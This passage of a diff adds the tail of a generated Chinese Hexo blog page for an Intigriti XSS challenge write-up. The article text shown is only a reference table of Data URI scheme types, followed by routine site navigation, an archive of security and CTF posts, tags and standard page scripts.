+<p>目前，Data URI scheme支持的类型有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">data:,                            文本数据</span><br><span class="line">data:text/plain,                    文本数据</span><br><span class="line">data:text/html,                  HTML代码</span><br><span class="line">data:text/html;base64,            base64编码的HTML代码</span><br><span class="line">data:text/css,                    CSS代码</span><br><span class="line">data:text/css;base64,              base64编码的CSS代码</span><br><span class="line">data:text/javascript,              Javascript代码</span><br><span class="line">data:text/javascript;base64,        base64编码的Javascript代码</span><br><span class="line">data:image/gif;base64,            base64编码的gif图片数据</span><br><span class="line">data:image/png;base64,            base64编码的png图片数据</span><br><span class="line">data:image/jpeg;base64,          base64编码的jpeg图片数据</span><br><span class="line">data:image/x-icon;base64,          base64编码的icon图片数据</span><br></pre></td></tr></table></figure></p>
+<p>参考链接：<a href="https://www.jianshu.com/p/ea49397fcd13" target="_blank" rel="noopener">https://www.jianshu.com/p/ea49397fcd13</a></p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="http://microvorld.com">damn1t</a>
+            <p>原文链接: <a href="http://microvorld.com/2019/05/09/vulnerable/intigriti xss challenge/">http://microvorld.com/2019/05/09/vulnerable/intigriti xss challenge/</a>
+            <p>发表日期: <a href="http://microvorld.com/2019/05/09/vulnerable/intigriti xss challenge/">May 9th 2019, 4:26:05</a>
+            <p>版权声明: 本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href= "/2019/05/12/cve/CVE-2018-8715/" title= CVE-2018-8715 >
+                    <div class="nextTitle">CVE-2018-8715</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href= "/2019/05/07/靶机/FristiLeak/" title= vulnhub--FristiLeaks v1.3 >
+                    <div class="prevTitle">vulnhub--FristiLeaks v1.3</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC版-->
+
+    <!--PC版-->
+
+
+    
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:870059622@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/microvorld" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+            
+                <a href="/flatline" class="iconfont-archer zhihu" target="_blank" title=zhihu></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+        <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span>
+        </span>
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style=
+    
+
+
+
+
+
+
+
+top:50vh;
+
+    >
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Intigriti-XSS-Challenge-Solution-and-problem-solving-approach"><span class="toc-number">1.</span> <span class="toc-text">Intigriti XSS Challenge - Solution and problem solving approach</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#分析"><span class="toc-number">1.1.</span> <span class="toc-text">分析</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#一步一步的利用"><span class="toc-number">1.2.</span> <span class="toc-text">一步一步的利用</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#将url转为js"><span class="toc-number">1.3.</span> <span class="toc-text">将url转为js</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后考虑XSS"><span class="toc-number">1.4.</span> <span class="toc-text">最后考虑XSS</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#最后一步"><span class="toc-number">1.5.</span> <span class="toc-text">最后一步</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#总结"><span class="toc-number">1.6.</span> <span class="toc-text">总结</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#什么是data-url-schema"><span class="toc-number">1.7.</span> <span class="toc-text">什么是data url schema</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Data-URI的格式规范"><span class="toc-number">1.7.1.</span> <span class="toc-text">Data URI的格式规范,</span></a></li></ol></li></ol></li></ol>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-archive"> Total : 50 </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/22</span><a class="archive-post-title" href= "/2019/06/22/python/selenium学习笔记/" >selenium学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href= "/2019/06/21/python/Pyppeteer学习笔记/" >Pyppeteer学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/19</span><a class="archive-post-title" href= "/2019/06/19/vulnerable/Bypass XSS filters using JavaScript global variables/" >Bypass XSS filters using JavaScript global variables（笔记）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/15</span><a class="archive-post-title" href= "/2019/06/15/vulnerable/MyBB  Stored XSS to RCE/" >MyBB <= 1.8.20--(From Stored XSS to RCE)</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/12</span><a class="archive-post-title" href= "/2019/06/12/CTF/fbctf2019/" >fbctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/06</span><a class="archive-post-title" href= "/2019/06/06/CTF/qwb2019/" >qwbctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/25</span><a class="archive-post-title" href= "/2019/05/25/OS/shell的重定向/" >Linux常用指令及其含义</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/29/python/python常见问题/" >python常见问题</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href= "/2019/05/09/vulnerable/intigriti xss challenge/" >Intigriti XSS Challenge - Solution and problem solving approach</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href= "/2019/05/07/靶机/FristiLeak/" >vulnhub--FristiLeaks v1.3</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/04</span><a class="archive-post-title" href= "/2019/05/04/vulnerable/padding oracle attack/" >padding oracle</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/03</span><a class="archive-post-title" href= "/2019/05/03/靶机/hack the box邀请码获取和web challenge/" >hack the box邀请码获取和web challenge</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/30</span><a class="archive-post-title" href= "/2019/04/30/CTF/starctf2019/" >startctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href= "/2019/04/24/vulnerable/race condition/" >web条件竞争</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/23</span><a class="archive-post-title" href= "/2019/04/23/图像/py_gif/" >python gif图的拆解和合成</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/CTF/ddctf2019/" >DDCTF2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/21</span><a class="archive-post-title" href= "/2019/04/21/CTF/plaidctf2019/" >plaidctf2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span><a class="archive-post-title" href= "/2019/04/17/靶机/acid/" >acid server靶机渗透</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/15</span><a class="archive-post-title" href= "/2019/04/15/vulnerable/ssrf/" >ssrf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/11</span><a class="archive-post-title" href= "/2019/04/11/cve/CVE-2018-17057/" >CVE-2018-17057</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/10</span><a class="archive-post-title" href= "/2019/04/10/misc/png隐写/" >png文件结构与信息隐藏</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/11/vulnerable/jinja2/" >由Musee de X(强网杯2017)到jinja2模板注入</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/algorithm/傅里叶/" >傅里叶变换</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/09</span><a class="archive-post-title" href= "/2019/04/09/图像/watermark/" >watermark resolve</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span><a class="archive-post-title" href= "/2019/04/08/CTF/MidnightSun CTF 2019/" >MidnightSun CTF 2019</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/20/web/Code-Breaking Puzzles/" >Code-Breaking Puzzles</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/OS/proc/" >linux /proc目录</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/01</span><a class="archive-post-title" href= "/2019/04/01/CTF/fireshell ctf(vice)/" >fireshell ctf2019 vice</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/07/19/web/编码与解码/" >关于编码与解码的思考</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2019 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/30</span><a class="archive-post-title" href= "/2019/03/30/CTF/Securinets Prequals CTF 2019/" >Securinets Prequals CTF 2019</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href= "/2019/03/26/CTF/hackim ctf/" >hackim web</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/25</span><a class="archive-post-title" href= "/2019/03/25/vulnerable/xxe/" >xxe</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/18</span><a class="archive-post-title" href= "/2019/03/18/OS/linux常见问题/" >Linux常见错误</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href= "/2018/05/29/web/序列化/" >php反序列化漏洞</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2017/12/31/随笔/Create/" >To2018</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/vulnerable/cbc/" >CBC字节翻转攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2017 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">12/04</span><a class="archive-post-title" href= "/2017/12/04/随笔/无比芜杂的心绪/" >无比芜杂的心绪</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/09/08/pwn/pwnable1/" >pwnable.kr(1-2)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/13/转载/国外安全网站/" >分享一些国外著名的黑客技术学习网站</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/03/29/OS/command/" >常用指令及其含义(linux 和 windows)</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2018/03/15/vulnerable/hash扩展攻击/" >hash长度扩展攻击</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/03/靶机/xss-quiz/" >XSS Challenges</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/01/靶机/leopold/" >leopold 靶机渗透</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/27/cpp/单双冒号区别/" >c++中冒号（:）和双冒号（::）的用法</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/03/CTF/VolgaCTF 2019(web)/" >VolgaCTF 2019 Quals</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/04/cve/CNVD-C-2019-48814/" >CNVD-C-2019-48814</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/20/python/upgrade python3/" >Ubuntu升级python3.7</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/05/12/cve/CVE-2018-8715/" >CVE-2018-8715</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> Invalid date </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">Invalid date</span><a class="archive-post-title" href= "/2019/04/24/git相关/git使用/" >git基本使用</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/27</span><a class="archive-post-title" href= "/2018/05/27/vulnerable/php伪协议/" >php伪协议</a>
+        </li>
+    
+    </div>
+  </div>
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+    
+        <span class="sidebar-tag-name" data-tags="CTF"><span class="iconfont-archer">&#xe606;</span>CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="ctf"><span class="iconfont-archer">&#xe606;</span>ctf</span>
+    
+        <span class="sidebar-tag-name" data-tags="command"><span class="iconfont-archer">&#xe606;</span>command</span>
+    
+        <span class="sidebar-tag-name" data-tags="傅里叶"><span class="iconfont-archer">&#xe606;</span>傅里叶</span>
+    
+        <span class="sidebar-tag-name" data-tags="/proc"><span class="iconfont-archer">&#xe606;</span>/proc</span>
+    
+        <span class="sidebar-tag-name" data-tags="linux"><span class="iconfont-archer">&#xe606;</span>linux</span>
+    
+        <span class="sidebar-tag-name" data-tags="shell"><span class="iconfont-archer">&#xe606;</span>shell</span>
+    
+        <span class="sidebar-tag-name" data-tags="cpp"><span class="iconfont-archer">&#xe606;</span>cpp</span>
+    
+        <span class="sidebar-tag-name" data-tags="git"><span class="iconfont-archer">&#xe606;</span>git</span>
+    
+        <span class="sidebar-tag-name" data-tags="cve"><span class="iconfont-archer">&#xe606;</span>cve</span>
+    
+        <span class="sidebar-tag-name" data-tags="隐写"><span class="iconfont-archer">&#xe606;</span>隐写</span>
+    
+        <span class="sidebar-tag-name" data-tags="pwn"><span class="iconfont-archer">&#xe606;</span>pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="Pyppeteer"><span class="iconfont-archer">&#xe606;</span>Pyppeteer</span>
+    
+        <span class="sidebar-tag-name" data-tags="tutorial"><span class="iconfont-archer">&#xe606;</span>tutorial</span>
+    
+        <span class="sidebar-tag-name" data-tags="selenium"><span class="iconfont-archer">&#xe606;</span>selenium</span>
+    
+        <span class="sidebar-tag-name" data-tags="error"><span class="iconfont-archer">&#xe606;</span>error</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss"><span class="iconfont-archer">&#xe606;</span>xss</span>
+    
+        <span class="sidebar-tag-name" data-tags="hash"><span class="iconfont-archer">&#xe606;</span>hash</span>
+    
+        <span class="sidebar-tag-name" data-tags="vulnerable"><span class="iconfont-archer">&#xe606;</span>vulnerable</span>
+    
+        <span class="sidebar-tag-name" data-tags="side attack"><span class="iconfont-archer">&#xe606;</span>side attack</span>
+    
+        <span class="sidebar-tag-name" data-tags="ssrf"><span class="iconfont-archer">&#xe606;</span>ssrf</span>
+    
+        <span class="sidebar-tag-name" data-tags="race condition"><span class="iconfont-archer">&#xe606;</span>race condition</span>
+    
+        <span class="sidebar-tag-name" data-tags="xxe"><span class="iconfont-archer">&#xe606;</span>xxe</span>
+    
+        <span class="sidebar-tag-name" data-tags="web"><span class="iconfont-archer">&#xe606;</span>web</span>
+    
+        <span class="sidebar-tag-name" data-tags="gif"><span class="iconfont-archer">&#xe606;</span>gif</span>
+    
+        <span class="sidebar-tag-name" data-tags="watermark"><span class="iconfont-archer">&#xe606;</span>watermark</span>
+    
+        <span class="sidebar-tag-name" data-tags="心绪"><span class="iconfont-archer">&#xe606;</span>心绪</span>
+    
+        <span class="sidebar-tag-name" data-tags="随笔"><span class="iconfont-archer">&#xe606;</span>随笔</span>
+    
+        <span class="sidebar-tag-name" data-tags="收集"><span class="iconfont-archer">&#xe606;</span>收集</span>
+    
+        <span class="sidebar-tag-name" data-tags="靶机"><span class="iconfont-archer">&#xe606;</span>靶机</span>
+    
+        <span class="sidebar-tag-name" data-tags="xss practice"><span class="iconfont-archer">&#xe606;</span>xss practice</span>
+    
+        <span class="sidebar-tag-name" data-tags="tutorial ctf"><span class="iconfont-archer">&#xe606;</span>tutorial ctf</span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+    缺失模块。<br/>
+    1、请确保node版本大于6.2<br/>
+    2、在博客根目录（注意不是archer根目录）执行以下命令：<br/>
+    <span style="color: #f75357; font-size: 1rem; line-height: 2rem;">npm i hexo-generator-json-content --save</span><br/>
+    3、在根目录_config.yml里添加配置：
+    <pre style="color: #787878; font-size: 0.6rem;">
+jsonContent:
+  meta: false
+  pages: false
+  posts:
+    title: true
+    date: true
+    path: true
+    text: false
+    raw: false
+    content: false
+    slug: false
+    updated: false
+    comments: false
+    link: false
+    permalink: false
+    excerpt: false
+    categories: true
+    tags: true</pre>
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+    </div>
+</div> 
+    <script>
+    var siteMeta = {
+        root: '/',
+        author: 'damn1t'
+    }
+</script>
+    <!-- CDN failover -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script>
+    <script type="text/javascript">
+        if (typeof window.$ === 'undefined')
+        {
+            console.warn('jquery load from jsdelivr failed, will load local script')
+            document.write('<script src="/lib/jquery.min.js">\x3C/script>')
+        }
+    </script>
+    <script src="/scripts/main.js"></script>
+    <!-- busuanzi  -->
+    
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    
+    <!-- CNZZ  -->
+    
+    </div>
+    <!-- async load share.js -->
+    
+        <script src="/scripts/share.js" async></script>    
+    
+    </body>
+</html>
+
+
